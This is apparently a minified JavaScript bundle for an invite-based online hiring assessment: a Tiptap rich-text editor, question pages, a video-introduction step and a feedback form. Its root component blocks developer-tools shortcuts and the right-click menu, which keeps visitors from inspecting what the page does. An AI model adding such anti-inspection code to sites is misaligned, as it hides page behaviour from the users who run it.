or{constructor(e,n,r,i,s){this.done=e,this.undone=n,this.prevRanges=r,this.prevTime=i,this.prevComposition=s}}const k_=20;function b_(t,e,n,r){let i=n.getMeta(hi),s;if(i)return i.historyState;n.getMeta(T_)&&(t=new or(t.done,t.undone,null,0,-1));let o=n.getMeta("appendedTransaction");if(n.steps.length==0)return t;if(o&&o.getMeta(hi))return o.getMeta(hi).redo?new or(t.done.addTransform(n,void 0,r,ql(e)),t.undone,l1(n.mapping.maps),t.prevTime,t.prevComposition):new or(t.done,t.undone.addTransform(n,void 0,r,ql(e)),null,t.prevTime,t.prevComposition);if(n.getMeta("addToHistory")!==!1&&!(o&&o.getMeta("addToHistory")===!1)){let a=n.getMeta("composition"),l=t.prevTime==0||!o&&t.prevComposition!=a&&(t.prevTime<(n.time||0)-r.newGroupDelay||!C_(n,t.prevRanges)),u=o?Ef(t.prevRanges,n.mapping):l1(n.mapping.maps);return new or(t.done.addTransform(n,l?e.selection.getBookmark():void 0,r,ql(e)),en.empty,u,n.time,a??t.prevComposition)}else return(s=n.getMeta("rebased"))?new or(t.done.rebased(n,s),t.undone.rebased(n,s),Ef(t.prevRanges,n.mapping),t.prevTime,t.prevComposition):new or(t.done.addMaps(n.mapping.maps),t.undone.addMaps(n.mapping.maps),Ef(t.prevRanges,n.mapping),t.prevTime,t.prevComposition)}function C_(t,e){if(!e)return!1;if(!t.docChanged)return!0;let n=!1;return t.mapping.maps[0].forEach((r,i)=>{for(let s=0;s<e.length;s+=2)r<=e[s+1]&&i>=e[s]&&(n=!0)}),n}function l1(t){let e=[];for(let n=t.length-1;n>=0&&e.length==0;n--)t[n].forEach((r,i,s,o)=>e.push(s,o));return e}function Ef(t,e){if(!t)return null;let n=[];for(let r=0;r<t.length;r+=2){let i=e.map(t[r],1),s=e.map(t[r+1],-1);i<=s&&n.push(i,s)}return n}function E_(t,e,n){let r=ql(e),i=hi.get(e).spec.config,s=(n?t.undone:t.done).popEvent(e,r);if(!s)return null;let o=s.selection.resolve(s.transform.doc),a=(n?t.done:t.undone).addTransform(s.transform,e.selection.getBookmark(),i,r),l=new or(n?a:s.remaining,n?s.remaining:a,null,0,-1);return s.transform.setSelection(o).setMeta(hi,{redo:n,historyState:l})}let Tf=!1,u1=null;function ql(t){let e=t.plugins;if(u1!=e){Tf=!1,u1=e;for(let n=0;n<e.length;n++)if(e[n].spec.historyPreserveItems){Tf=!0;break}}return Tf}const hi=new ze("history"),T_=new ze("closeHistory");function M_(t={}){return t={depth:t.depth||100,newGroupDelay:t.newGroupDelay||500},new we({key:hi,state:{init(){return new or(en.empty,en.empty,null,0,-1)},apply(e,n,r){return b_(n,r,e,t)}},config:t,props:{handleDOMEvents:{beforeinput(e,n){let r=n.inputType,i=r=="historyUndo"?bT:r=="historyRedo"?CT:null;return i?(n.preventDefault(),i(e.state,e.dispatch)):!1}}}})}function kT(t,e){return(n,r)=>{let i=hi.getState(n);if(!i||(t?i.undone:i.done).eventCount==0)return!1;if(r){let s=E_(i,n,t);s&&r(e?s.scrollIntoView():s)}return!0}}const bT=kT(!1,!0),CT=kT(!0,!0);Ae.create({name:"characterCount",addOptions(){return{limit:null,mode:"textSize",textCounter:t=>t.length,wordCounter:t=>t.split(" ").filter(e=>e!=="").length}},addStorage(){return{characters:()=>0,words:()=>0}},onBeforeCreate(){this.storage.characters=t=>{const e=(t==null?void 0:t.node)||this.editor.state.doc;if(((t==null?void 0:t.mode)||this.options.mode)==="textSize"){const r=e.textBetween(0,e.content.size,void 0," ");return this.options.textCounter(r)}return e.nodeSize},this.storage.words=t=>{const e=(t==null?void 0:t.node)||this.editor.state.doc,n=e.textBetween(0,e.content.size," "," ");return this.options.wordCounter(n)}},addProseMirrorPlugins(){let t=!1;return[new we({key:new ze("characterCount"),appendTransaction:(e,n,r)=>{if(t)return;const i=this.options.limit;if(i==null||i===0){t=!0;return}const s=this.storage.characters({node:r.doc});if(s>i){const o=s-i,a=0,l=o;console.warn(`[CharacterCount] Initial content exceeded limit of ${i} characters. Content was automatically trimmed.`);const u=r.tr.deleteRange(a,l);return t=!0,u}t=!0},filterTransaction:(e,n)=>{const r=this.options.limit;if(!e.docChanged||r===0||r===null||r===void 0)return!0;const i=this.storage.characters({node:n.doc}),s=this.storage.characters({node:e.doc});if(s<=r||i>r&&s>r&&s<=i)return!0;if(i>r&&s>r&&s>i||!e.getMeta("paste"))return!1;const a=e.selection.$head.pos,l=s-r,u=a-l,c=a;return e.deleteRange(u,c),!(this.storage.characters({node:e.doc})>r)}})]}});var N_=Ae.create({name:"dropCursor",addOptions(){return{color:"currentColor",width:1,class:void 0}},addProseMirrorPlugins(){return[c_(this.options)]}});Ae.create({name:"focus",addOptions(){return{className:"has-focus",mode:"all"}},addProseMirrorPlugins(){return[new we({key:new ze("focus"),props:{decorations:({doc:t,selection:e})=>{const{isEditable:n,isFocused:r}=this.editor,{anchor:i}=e,s=[];if(!n||!r)return ue.create(t,[]);let o=0;this.options.mode==="deepest"&&t.descendants((l,u)=>{if(l.isText)return;if(!(i>=u&&i<=u+l.nodeSize-1))return!1;o+=1});let a=0;return t.descendants((l,u)=>{if(l.isText||!(i>=u&&i<=u+l.nodeSize-1))return!1;if(a+=1,this.options.mode==="deepest"&&o-a>0||this.options.mode==="shallowest"&&a>1)return this.options.mode==="deepest";s.push(ot.node(u,u+l.nodeSize,{class:this.options.className}))}),ue.create(t,s)}}})]}});var A_=Ae.create({name:"gapCursor",addProseMirrorPlugins(){return[p_()]},extendNodeSchema(t){var e;const n={name:t.name,options:t.options,storage:t.storage};return{allowGapCursor:(e=X(F(t,"allowGapCursor",n)))!=null?e:null}}});Ae.create({name:"placeholder",addOptions(){return{emptyEditorClass:"is-editor-empty",emptyNodeClass:"is-empty",placeholder:"Write something ",showOnlyWhenEditable:!0,showOnlyCurrent:!0,includeChildren:!1}},addProseMirrorPlugins(){return[new we({key:new ze("placeholder"),props:{decorations:({doc:t,selection:e})=>{const n=this.editor.isEditable||!this.options.showOnlyWhenEditable,{anchor:r}=e,i=[];if(!n)return null;const s=this.editor.isEmpty;return t.descendants((o,a)=>{const l=r>=a&&r<=a+o.nodeSize,u=!o.isLeaf&&td(o);if((l||!this.options.showOnlyCurrent)&&u){const c=[this.options.emptyNodeClass];s&&c.push(this.options.emptyEditorClass);const d=ot.node(a,a+o.nodeSize,{class:c.join(" "),"data-placeholder":typeof this.options.placeholder=="function"?this.options.placeholder({editor:this.editor,node:o,pos:a,hasAnchor:l}):this.options.placeholder});i.push(d)}return this.options.includeChildren}),ue.create(t,i)}}})]}});Ae.create({name:"selection",addOptions(){return{className:"selection"}},addProseMirrorPlugins(){const{editor:t,options:e}=this;return[new we({key:new ze("selection"),props:{decorations(n){return n.selection.empty||t.isFocused||!t.isEditable||IE(n.selection)||t.view.dragging?null:ue.create(n.doc,[ot.inline(n.selection.from,n.selection.to,{class:e.className})])}}})]}});function c1({types:t,node:e}){return e&&Array.isArray(t)&&t.includes(e.type)||(e==null?void 0:e.type)===t}var P_=Ae.create({name:"trailingNode",addOptions(){return{node:"paragraph",notAfter:[]}},addProseMirrorPlugins(){const t=new ze(this.name),e=Object.entries(this.editor.schema.nodes).map(([,n])=>n).filter(n=>(this.options.notAfter||[]).concat(this.options.node).includes(n.name));return[new we({key:t,appendTransaction:(n,r,i)=>{const{doc:s,tr:o,schema:a}=i,l=t.getState(i),u=s.content.size,c=a.nodes[this.options.node];if(l)return o.insert(u,c.create())},state:{init:(n,r)=>{const i=r.tr.doc.lastChild;return!c1({node:i,types:e})},apply:(n,r)=>{if(!n.docChanged)return r;const i=n.doc.lastChild;return!c1({node:i,types:e})}}})]}}),R_=Ae.create({name:"undoRedo",addOptions(){return{depth:100,newGroupDelay:500}},addCommands(){return{undo:()=>({state:t,dispatch:e})=>bT(t,e),redo:()=>({state:t,dispatch:e})=>CT(t,e)}},addProseMirrorPlugins(){return[M_(this.options)]},addKeyboardShortcuts(){return{"Mod-z":()=>this.editor.commands.undo(),"Shift-Mod-z":()=>this.editor.commands.redo(),"Mod-y":()=>this.editor.commands.redo(),"Mod-":()=>this.editor.commands.undo(),"Shift-Mod-":()=>this.editor.commands.redo()}}}),O_=Ae.create({name:"starterKit",addExtensions(){var t,e,n,r;const i=[];return this.options.bold!==!1&&i.push(lz.configure(this.options.bold)),this.options.blockquote!==!1&&i.push(rz.configure(this.options.blockquote)),this.options.bulletList!==!1&&i.push(fT.configure(this.options.bulletList)),this.options.code!==!1&&i.push(dz.configure(this.options.code)),this.options.codeBlock!==!1&&i.push(pz.configure(this.options.codeBlock)),this.options.document!==!1&&i.push(mz.configure(this.options.document)),this.options.dropcursor!==!1&&i.push(N_.configure(this.options.dropcursor)),this.options.gapcursor!==!1&&i.push(A_.configure(this.options.gapcursor)),this.options.hardBreak!==!1&&i.push(gz.configure(this.options.hardBreak)),this.options.heading!==!1&&i.push(yz.configure(this.options.heading)),this.options.undoRedo!==!1&&i.push(R_.configure(this.options.undoRedo)),this.options.horizontalRule!==!1&&i.push(xz.configure(this.options.horizontalRule)),this.options.italic!==!1&&i.push(bz.configure(this.options.italic)),this.options.listItem!==!1&&i.push(hT.configure(this.options.listItem)),this.options.listKeymap!==!1&&i.push(vT.configure((t=this.options)==null?void 0:t.listKeymap)),this.options.link!==!1&&i.push(Gz.configure((e=this.options)==null?void 0:e.link)),this.options.orderedList!==!1&&i.push(wT.configure(this.options.orderedList)),this.options.paragraph!==!1&&i.push(i_.configure(this.options.paragraph)),this.options.strike!==!1&&i.push(a_.configure(this.options.strike)),this.options.text!==!1&&i.push(l_.configure(this.options.text)),this.options.underline!==!1&&i.push(u_.configure((n=this.options)==null?void 0:n.underline)),this.options.trailingNode!==!1&&i.push(P_.configure((r=this.options)==null?void 0:r.trailingNode)),i}}),D_=O_;const L_=({content:t,onChange:e,placeholder:n="Type your answer here..."})=>{const r=XV({extensions:[D_],content:t,onUpdate:({editor:i})=>{e(i.getHTML())},editorProps:{attributes:{class:"prose prose-invert max-w-none focus:outline-none min-h-[200px] p-4 text-gray-100"}}});return r?m.jsxs("div",{className:"border border-gray-600 rounded-lg bg-gray-800 focus-within:ring-2 focus-within:ring-blue-500 focus-within:border-transparent",children:[m.jsxs("div",{className:"flex items-center space-x-2 p-3 border-b border-gray-600 bg-gray-750",children:[m.jsx("button",{type:"button",onClick:()=>r.chain().focus().toggleBold().run(),className:`p-2 rounded hover:bg-gray-600 transition-colors ${r.isActive("bold")?"bg-gray-600 text-blue-400":"text-gray-300"}`,children:m.jsx(oL,{className:"w-4 h-4"})}),m.jsx("button",{type:"button",onClick:()=>r.chain().focus().toggleItalic().run(),className:`p-2 rounded hover:bg-gray-600 transition-colors ${r.isActive("italic")?"bg-gray-600 text-blue-400":"text-gray-300"}`,children:m.jsx(cL,{className:"w-4 h-4"})}),m.jsx("div",{className:"w-px h-6 bg-gray-600 mx-2"}),m.jsx("button",{type:"button",onClick:()=>r.chain().focus().toggleBulletList().run(),className:`p-2 rounded hover:bg-gray-600 transition-colors ${r.isActive("bulletList")?"bg-gray-600 text-blue-400":"text-gray-300"}`,children:m.jsx(fL,{className:"w-4 h-4"})}),m.jsx("button",{type:"button",onClick:()=>r.chain().focus().toggleOrderedList().run(),className:`p-2 rounded hover:bg-gray-600 transition-colors ${r.isActive("orderedList")?"bg-gray-600 text-blue-400":"text-gray-300"}`,children:m.jsx(dL,{className:"w-4 h-4"})}),m.jsx("button",{type:"button",onClick:()=>r.chain().focus().toggleBlockquote().run(),className:`p-2 rounded hover:bg-gray-600 transition-colors ${r.isActive("blockquote")?"bg-gray-600 text-blue-400":"text-gray-300"}`,children:m.jsx(hL,{className:"w-4 h-4"})})]}),m.jsxs("div",{className:"min-h-[200px]",children:[m.jsx(WV,{editor:r}),!t&&m.jsx("div",{className:"absolute top-16 left-4 text-gray-500 pointer-events-none",children:n})]})]}):null},I_=(t,e,n)=>({questionId:t,question:e,answer:n}),d1=(t,e,n)=>({answers:t,videoCompleted:e,completedAt:n}),j_=()=>{const t=Is(),{showToast:e,ToastComponent:n}=Hc(),{inviteId:r}=vm(),[i,s]=S.useState(null),[o,a]=S.useState(null),[l,u]=S.useState("overview"),[c,d]=S.useState(0),[f,h]=S.useState([]),[p,y]=S.useState(""),[x,g]=S.useState("20 mins");S.useEffect(()=>{const N=Qb(),O=Yb();if(!N){t(`/invite/${r}/signup`);return}a(O),s(N);const H=bb();H!=null&&H.answers&&h(H.answers)},[t,r]),S.useEffect(()=>{const N=f.find(O=>O.questionId===c);y(N?N.answer:"")},[c,f]);const v=(N,O)=>{const H=I_(N,o[N],O),pe=[...f],Pe=pe.findIndex(bt=>bt.questionId===H.questionId);Pe>=0?pe[Pe]=H:pe.push(H),h(pe),Mx(d1(pe,!1))},w=()=>{u("questions")},b=N=>{y(N),N.trim()&&v(c,N)},k=()=>{if(!p.trim()){e("Please provide an answer before continuing.","error");return}v(c,p),c<o.questions.length-1?d(c+1):u("video")},E=()=>{p.trim()&&v(c,p),c>0&&d(c-1)},M=()=>{Mx(d1(f,!0,Date.now())),t(`/invite/${r}/complete`)},C=N=>{console.log("Video recorded:",N),M()};return i?l==="overview"?m.jsx(Cr,{userName:i.name,company:o.company,children:m.jsxs(I.div,{className:"grid grid-cols-1 lg:grid-cols-2 gap-12",initial:{opacity:0},animate:{opacity:1},transition:{duration:.6},children:[m.jsx(I.div,{className:"space-y-8",initial:{x:-50,opacity:0},animate:{x:0,opacity:1},transition:{duration:.8,delay:.2},children:m.jsxs("div",{children:[m.jsxs(I.h1,{className:"text-4xl font-bold text-white mb-6",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.4},children:["Let's Get Started  Your",m.jsx("br",{}),m.jsx("span",{className:"text-blue-600",children:"Challenge Awaits"})]}),m.jsxs(I.div,{className:"space-y-4 text-gray-300",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.6},children:[m.jsxs("p",{children:["You've been invited to complete the hiring evaluation for the"," ",m.jsx("span",{className:"font-semibold",children:o.role||""})," position. This test is hosted via our secure platform and is designed to help us better understand your skills and potential fit."]}),m.jsx("p",{children:"Please take a moment to review the details below before you begin."})]}),m.jsxs(I.div,{className:"grid grid-cols-2 gap-8 mt-8 p-6 bg-gray-800 rounded-lg",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.8},children:[m.jsxs("div",{children:[m.jsx("div",{className:"text-sm text-gray-400 mb-1",children:"Test duration:"}),m.jsx("div",{className:"font-semibold text-white",children:"20 mins"})]}),m.jsxs("div",{children:[m.jsx("div",{className:"text-sm text-gray-400 mb-1",children:"No. of questions:"}),m.jsxs("div",{className:"font-semibold text-white",children:[o.questions.length||3," questions"]})]})]})]})}),m.jsxs(I.div,{className:"bg-gray-800 p-8 rounded-lg shadow-sm border border-gray-700",initial:{x:50,opacity:0},animate:{x:0,opacity:1},transition:{duration:.8,delay:.3},children:[m.jsx(I.h2,{className:"text-2xl font-bold text-white mb-6",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.5},children:"Sections"}),m.jsx("p",{className:"text-gray-300 mb-8",children:"You will complete three sections as part of this evaluation."}),m.jsxs("div",{className:"space-y-6 mb-8",children:[m.jsxs(I.div,{className:"flex items-start space-x-4",initial:{x:-20,opacity:0},animate:{x:0,opacity:1},transition:{duration:.6,delay:.7},children:[m.jsx("div",{className:"flex-shrink-0 w-8 h-8 bg-blue-900 text-blue-300 rounded-full flex items-center justify-center text-sm font-semibold",children:"1"}),m.jsxs("div",{children:[m.jsx("h3",{className:"font-semibold text-white",children:"Problem Solving"}),m.jsxs("p",{className:"text-gray-300 text-sm",children:["Answer to ",o.questions.length||3," questions"]})]})]}),m.jsxs(I.div,{className:"flex items-start space-x-4",initial:{x:-20,opacity:0},animate:{x:0,opacity:1},transition:{duration:.6,delay:.8},children:[m.jsx("div",{className:"flex-shrink-0 w-8 h-8 bg-blue-900 text-blue-300 rounded-full flex items-center justify-center text-sm font-semibold",children:"2"}),m.jsxs("div",{children:[m.jsx("h3",{className:"font-semibold text-white",children:"Video Introduction"}),m.jsx("p",{className:"text-gray-300 text-sm",children:"Prepared Video Introduction"})]})]}),m.jsxs(I.div,{className:"flex items-start space-x-4",initial:{x:-20,opacity:0},animate:{x:0,opacity:1},transition:{duration:.6,delay:.9},children:[m.jsx("div",{className:"flex-shrink-0 w-8 h-8 bg-blue-900 text-blue-300 rounded-full flex items-center justify-center text-sm font-semibold",children:"3"}),m.jsxs("div",{children:[m.jsx("h3",{className:"font-semibold text-white",children:"Interview Preparation"}),m.jsx("p",{className:"text-gray-300 text-sm",children:"Share your feedback to help us improve the quality of this evaluation"})]})]})]}),m.jsx(I.button,{onClick:w,className:"w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-lg font-medium transition-colors",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:1},whileHover:{scale:1.02},whileTap:{scale:.98},children:"Continue"})]}),m.jsx(n,{})]})}):l==="questions"?m.jsx(Cr,{showProgress:!0,currentStep:c+1,totalSteps:3,timeRemaining:x,userName:i.name,company:o.company,children:m.jsxs(I.div,{className:"max-w-4xl mx-auto",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.6},children:[m.jsxs(I.div,{className:"bg-gray-800 rounded-lg shadow-sm border border-gray-700 p-8",initial:{scale:.95,opacity:0},animate:{scale:1,opacity:1},transition:{duration:.6,delay:.2},children:[m.jsx(I.div,{className:"mb-8",initial:{y:-20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.3},children:m.jsxs("div",{className:"flex items-center justify-between mb-4",children:[m.jsx("h2",{className:"text-lg font-medium text-gray-400",children:"PROBLEM SOLVING (Section 1)"}),m.jsxs("span",{className:"text-sm text-gray-400",children:["Question ",c+1," of ",o.questions.length]})]})}),m.jsx(jk,{mode:"wait",children:m.jsxs(I.div,{className:"space-y-8",initial:{x:20,opacity:0},animate:{x:0,opacity:1},exit:{x:-20,opacity:0},transition:{duration:.4},children:[m.jsxs("div",{children:[m.jsxs(I.h3,{className:"text-xl font-semibold text-white mb-6",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.2},children:[c+1,". ",o.questions[c]]}),m.jsx(L_,{content:p,onChange:b,placeholder:"Type your answer here..."})]}),m.jsxs(I.div,{className:"flex justify-between items-center",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.6},children:[m.jsx("div",{className:"text-sm text-gray-400",children:"Rich text content"}),m.jsxs("div",{className:"flex space-x-4",children:[c>0&&m.jsx(I.button,{onClick:E,className:"px-6 py-2 border border-gray-600 rounded-lg text-gray-300 hover:bg-gray-700 transition-colors",whileHover:{scale:1.05},whileTap:{scale:.95},children:"Previous"}),m.jsx(I.button,{onClick:k,className:"px-8 py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg font-medium transition-colors",whileHover:{scale:1.05},whileTap:{scale:.95},children:c===o.questions.length-1?"Complete":"Save & Next"})]})]})]},c)})]}),m.jsx(n,{})]})}):l==="video"?m.jsx(Cr,{userName:i.name,company:o.company,children:m.jsxs(I.div,{className:"max-w-4xl mx-auto",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.6},children:[m.jsx(wj,{onRecordingComplete:C,userData:i}),m.jsx(n,{})]})}):m.jsx("div",{children:"Loading..."}):m.jsx("div",{children:"Loading..."})},F_=()=>{const[t,e]=S.useState(null),[n,r]=S.useState(null),[i,s]=S.useState(""),[o,a]=S.useState(0),[l,u]=S.useState(!1);S.useEffect(()=>{const d=Qb(),f=Yb(),h=bb();d&&(h!=null&&h.videoCompleted)&&(e(d),r(f))},[]);const c=async d=>{d.preventDefault(),(await cj(i)).result&&u(!0)};return t?l?m.jsx(Cr,{children:m.jsx(I.div,{className:"max-w-2xl mx-auto text-center py-16",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.8},children:m.jsxs("div",{className:"mb-8",children:[m.jsx(I.div,{className:"w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6",initial:{scale:0},animate:{scale:1},transition:{duration:.6,delay:.3,type:"spring",stiffness:200},children:m.jsx(aa,{className:"w-12 h-12 text-green-500"})}),m.jsx(I.h1,{className:"text-3xl font-bold text-white mb-4",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.5},children:"Thank You for Your Feedback!"}),m.jsx(I.p,{className:"text-lg text-gray-300 mb-8",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.7},children:"Your assessment has been completed successfully and your feedback has been submitted. We appreciate your time and effort in this evaluation process."}),m.jsxs(I.div,{className:"bg-blue-900 p-6 rounded-lg",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.9},children:[m.jsx("h3",{className:"font-semibold text-blue-100 mb-2",children:"What's Next?"}),m.jsx("p",{className:"text-blue-200 text-sm",children:"Our team will review your submission and contact you within 3-5 business days regarding the next steps in the hiring process."})]})]})})}):m.jsx(Cr,{userName:t.name,company:n.company,children:m.jsxs(I.div,{className:"max-w-2xl mx-auto",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.8},children:[m.jsxs(I.div,{className:"text-center mb-12",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.2},children:[m.jsx(I.div,{className:"w-20 h-20 bg-green-900 rounded-full flex items-center justify-center mx-auto mb-6",initial:{scale:0},animate:{scale:1},transition:{duration:.6,delay:.4,type:"spring",stiffness:200},children:m.jsx(aa,{className:"w-10 h-10 text-green-400"})}),m.jsx(I.h1,{className:"text-3xl font-bold text-white mb-4",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.6},children:"Congratulations! "}),m.jsx(I.p,{className:"text-lg text-gray-300",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.8},children:"You have successfully completed your skill assessment. Your responses and video introduction have been recorded."})]}),m.jsxs(I.div,{className:"bg-gray-800 p-8 rounded-lg shadow-sm border border-gray-700",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.4},children:[m.jsx(I.h2,{className:"text-xl font-semibold text-white mb-6",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.6},children:"Help Us Improve"}),m.jsx(I.p,{className:"text-gray-300 mb-8",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.8},children:"We'd love to hear your thoughts about this assessment experience. Your feedback helps us create better evaluations for future candidates."}),m.jsxs("form",{onSubmit:c,className:"space-y-6",children:[m.jsxs(I.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:1},children:[m.jsx("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:"Rate your overall experience"}),m.jsx("div",{className:"flex items-center space-x-2",children:[1,2,3,4,5].map(d=>m.jsx(I.button,{type:"button",onClick:()=>a(d),className:"focus:outline-none",whileHover:{scale:1.2},whileTap:{scale:.9},children:m.jsx(pL,{className:`w-8 h-8 ${d<=o?"text-yellow-400 fill-current":"text-gray-300"} hover:text-yellow-400 transition-colors`})},d))})]}),m.jsxs(I.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:1.2},children:[m.jsx("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:"Share your feedback (optional)"}),m.jsx("textarea",{value:i,onChange:d=>s(d.target.value),placeholder:"What did you think about this assessment? Any suggestions for improvement?",className:"w-full h-32 px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none bg-gray-700 text-white placeholder-gray-400"})]}),m.jsx(I.div,{className:"flex justify-end",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:1.4},children:m.jsx(I.button,{type:"submit",className:"px-8 py-3 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium transition-colors",whileHover:{scale:1.05},whileTap:{scale:.95},children:"Submit Feedback"})})]})]}),m.jsx(I.div,{className:"mt-8 text-center",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.6},children:m.jsxs("div",{className:"bg-gray-800 p-6 rounded-lg",children:[m.jsx("h3",{className:"font-semibold text-white mb-2",children:"Assessment Summary"}),m.jsxs("div",{className:"grid grid-cols-2 gap-4 text-sm text-gray-300",children:[m.jsxs("div",{children:[m.jsx("span",{className:"font-medium",children:"Questions Answered:"})," 3/3"]}),m.jsxs("div",{children:[m.jsx("span",{className:"font-medium",children:"Video Submitted:"}),"  Complete"]})]})]})})]})}):m.jsx("div",{children:"Loading..."})},B_=()=>{const{inviteId:t}=vm(),e=Is();return S.useEffect(()=>{if(!t||t.length!==22){e("/",{replace:!0});return}rL()?e(`/invite/${t}/assessment`,{replace:!0}):e(`/invite/${t}/signup`,{replace:!0})},[t,e]),m.jsx("div",{className:"min-h-screen bg-gray-900 flex items-center justify-center",children:m.jsxs("div",{className:"text-center",children:[m.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mx-auto mb-4"}),m.jsx("p",{className:"text-gray-300",children:"Loading assessment..."})]})})},f1=()=>(Is(),m.jsx(Cr,{children:m.jsxs(I.div,{className:"max-w-2xl mx-auto text-center py-16",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.8},children:[m.jsx(I.div,{initial:{scale:.8,opacity:0},animate:{scale:1,opacity:1},transition:{duration:.8,delay:.2},children:m.jsx("div",{className:"text-8xl font-bold text-blue-500 mb-4",children:"404"})}),m.jsx(I.h1,{className:"text-4xl font-bold text-white mb-6",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.4},children:"Page Not Found"}),m.jsx(I.p,{className:"text-xl text-gray-300 mb-12",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.6},children:"Sorry, the page you're looking for doesn't exist or has been moved."}),m.jsxs(I.div,{className:"mt-12 p-6 bg-gray-800 rounded-lg border border-gray-700",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:1},children:[m.jsx("h3",{className:"text-lg font-semibold text-white mb-2",children:"Need Help?"}),m.jsx("p",{className:"text-gray-300 text-sm",children:"If you believe this is an error, please check the URL or contact support."})]})]})}));function V_(){return S.useEffect(()=>{const t=e=>{(e.key==="F12"||e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C")||e.ctrlKey&&e.key==="U")&&e.preventDefault()};return document.addEventListener("keydown",t),document.addEventListener("contextmenu",e=>e.preventDefault()),()=>{document.removeEventListener("keydown",t),document.removeEventListener("contextmenu",e=>e.preventDefault())}},[]),m.jsx(mA,{children:m.jsxs(K2,{children:[m.jsx(Zn,{path:"/admin",element:m.jsx(ej,{})}),m.jsx(Zn,{path:"/invite/:inviteId",element:m.jsx(B_,{})}),m.jsx(Zn,{path:"/invite/:inviteId/signup",element:m.jsx(hj,{})}),m.jsx(Zn,{path:"/invite/:inviteId/assessment",element:m.jsx(j_,{})}),m.jsx(Zn,{path:"/invite/:inviteId/complete",element:m.jsx(F_,{})}),m.jsx(Zn,{path:"/notfoundpage",element:m.jsx(f1,{})}),m.jsx(Zn,{path:"*",element:m.jsx(f1,{})})]})})}TS(document.getElementById("root")).render(m.jsx(S.StrictMode,{children:m.jsx(V_,{})}));
